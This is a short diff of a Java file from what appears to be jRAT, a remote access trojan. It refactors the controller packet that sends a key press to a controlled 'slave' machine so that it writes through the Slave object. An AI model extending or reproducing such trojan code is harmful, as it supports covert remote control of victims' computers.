@@ -2,8 +2,6 @@ package jrat.controller.packets.outgoing;
 
 import jrat.controller.Slave;
 
-import java.io.DataOutputStream;
-
 
 public class Packet94KeyPress extends AbstractOutgoingPacket {
 
@@ -14,8 +12,8 @@ public class Packet94KeyPress extends AbstractOutgoingPacket {
 	}
 
 	@Override
-	public void write(Slave slave, DataOutputStream dos) throws Exception {
-		dos.writeInt(keyCode);
+	public void write(Slave slave) throws Exception {
+		slave.writeInt(keyCode);
 	}
 
 	@Override
